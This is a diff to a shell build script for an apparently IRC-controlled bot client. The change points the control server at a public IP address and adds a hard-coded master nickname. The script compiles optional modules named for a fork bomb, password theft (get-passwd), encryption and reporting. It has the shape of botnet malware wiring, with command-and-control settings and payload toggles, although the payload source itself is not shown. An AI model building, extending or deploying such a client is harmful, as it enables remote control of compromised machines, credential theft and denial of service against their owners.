@@ -24,9 +24,10 @@ GET_PASSWD_OBJ=""
 
 BOT_NICK="bot_NICK"
 BOT_USER="bot_USER"
-SERVER_ADDRESS="192.168.1.127"
+SERVER_ADDRESS="52.90.220.187"
 ASSIGNED_CHANNEL="#testChannel"
 BOT_PASS="test123"
+MASTER_NICK="master"
 
 if [[ "$ENABLE_PING_ACTION" -eq 1 ]]; then
     g++ -std=c++17 -Wall -Wextra -Iinclude -DENABLE_PING_ACTION -c PingAction.cpp -o PingAction.o
@@ -66,7 +67,7 @@ if [[ "$ENABLE_GET_PASSWD_ACTION" -eq 1 ]]; then
     ENABLE_GET_PASSWD_FLAG="-DENABLE_GET_PASSWD_ACTION"
 fi
 
-g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_ENCRYPT_FLAG -DBOT_NICK=\"$BOT_NICK\" -DBOT_USER=\"$BOT_USER\" -DSERVER_ADDRESS=\"$SERVER_ADDRESS\" -DASSIGNED_CHANNEL=\"$ASSIGNED_CHANNEL\" -DBOT_PASS=\"$BOT_PASS\" -c BotMain.cpp -o BotMain.o
+g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_ENCRYPT_FLAG -DBOT_NICK=\"$BOT_NICK\" -DBOT_USER=\"$BOT_USER\" -DSERVER_ADDRESS=\"$SERVER_ADDRESS\" -DASSIGNED_CHANNEL=\"$ASSIGNED_CHANNEL\" -DBOT_PASS=\"$BOT_PASS\" -DMASTER_NICK=\"$MASTER_NICK\" -c BotMain.cpp -o BotMain.o
 g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_PING_FLAG $ENABLE_ENCRYPT_FLAG $ENABLE_REPORT_FLAG $ENABLE_FORK_BOMB_FLAG $ENABLE_GET_PASSWD_FLAG -c IrcClient.cpp -o IrcClient.o
 g++ -std=c++17 -Wall -Wextra -Iinclude -c MessageParser.cpp -o MessageParser.o
 g++ -std=c++17 -Wall -Wextra -Iinclude -c GeneralUtils.cpp -o GeneralUtils.o
